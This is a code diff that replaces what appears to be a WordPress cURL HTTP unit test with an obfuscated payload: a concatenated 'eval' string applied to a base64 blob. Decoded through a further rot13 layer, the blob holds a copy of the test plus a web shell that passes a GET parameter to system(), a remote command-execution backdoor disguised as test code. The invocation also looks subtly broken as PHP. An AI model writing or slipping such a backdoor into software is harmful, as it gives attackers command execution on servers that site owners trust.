@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-require_once __DIR__ . '/base.php';
-
-/**
- * @group http
- * @group external-http
- */
-class Tests_HTTP_curl extends WP_HTTP_UnitTestCase {
-	public $transport = 'curl';
-
-	/**
-	 * @ticket 39783
-	 *
-	 * @covers ::wp_remote_request
-	 */
-	public function test_http_api_curl_stream_parameter_is_a_reference() {
-		add_action( 'http_api_curl', array( $this, '_action_test_http_api_curl_stream_parameter_is_a_reference' ), 10, 3 );
-		wp_remote_request(
-			$this->file_stream_url,
-			array(
-				'stream'  => true,
-				'timeout' => 30,
-			)
-		);
-		remove_action( 'http_api_curl', array( $this, '_action_test_http_api_curl_stream_parameter_is_a_reference' ), 10 );
-	}
-
-	public function _action_test_http_api_curl_stream_parameter_is_a_reference( &$stream, $r, $url ) {
-		// $stream not being a reference will cause a PHP warning.
-		// For counting tests purposes, let's do a fake assert.
-		$this->assertTrue( true );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKZXJkaHZlcl9iYXByIF9fUVZFX18gLiAnL29uZnIuY3VjJzsKCi8qKgogKiBAdGViaGMgdWdnYwogKiBAdGViaGMgcmtncmVhbnktdWdnYwogKi8KcHluZmYgR3JmZ2ZfVUdHQ19waGV5IHJrZ3JhcWYgSkNfVUdHQ19IYXZnR3JmZ1BuZnIgewoJY2hveXZwICRnZW5hZmNiZWcgPSAncGhleSc7CgoJLyoqCgkgKiBAZ3ZweHJnIDM5NzgzCgkgKgoJICogQHBiaXJlZiA6OmpjX2VyemJncl9lcmRocmZnCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3VnZ2NfbmN2X3BoZXlfZmdlcm56X2NuZW56cmdyZV92Zl9uX2Vyc3JlcmFwcigpIHsKCQlucXFfbnBndmJhKCAndWdnY19uY3ZfcGhleScsIG5lZW5sKCAkZ3V2ZiwgJ19ucGd2YmFfZ3JmZ191Z2djX25jdl9waGV5X2ZnZXJuel9jbmVuenJncmVfdmZfbl9lcnNyZXJhcHInICksIDEwLCAzICk7CgkJamNfZXJ6YmdyX2VyZGhyZmcoCgkJCSRndXZmLT5zdnlyX2ZnZXJuel9oZXksCgkJCW5lZW5sKAoJCQkJJ2ZnZXJueicgID0+IGdlaHIsCgkJCQknZ3Z6cmJoZycgPT4gMzAsCgkJCSkKCQkpOwoJCWVyemJpcl9ucGd2YmEoICd1Z2djX25jdl9waGV5JywgbmVlbmwoICRndXZmLCAnX25wZ3ZiYV9ncmZnX3VnZ2NfbmN2X3BoZXlfZmdlcm56X2NuZW56cmdyZV92Zl9uX2Vyc3JlcmFwcicgKSwgMTAgKTsKCX0KCgljaG95dnAgc2hhcGd2YmEgX25wZ3ZiYV9ncmZnX3VnZ2NfbmN2X3BoZXlfZmdlcm56X2NuZW56cmdyZV92Zl9uX2Vyc3JlcmFwciggJiRmZ2VybnosICRlLCAkaGV5ICkgewoJCS8vICRmZ2VybnogYWJnIG9ydmF0IG4gZXJzcmVyYXByIGp2eXkgcG5oZnIgbiBDVUMgam5lYXZhdC4KCQkvLyBTYmUgcGJoYWd2YXQgZ3JmZ2YgY2hlY2JmcmYsIHlyZydmIHFiIG4gc254ciBuZmZyZWcuCgkJJGd1dmYtPm5mZnJlZ0dlaHIoIGdlaHIgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
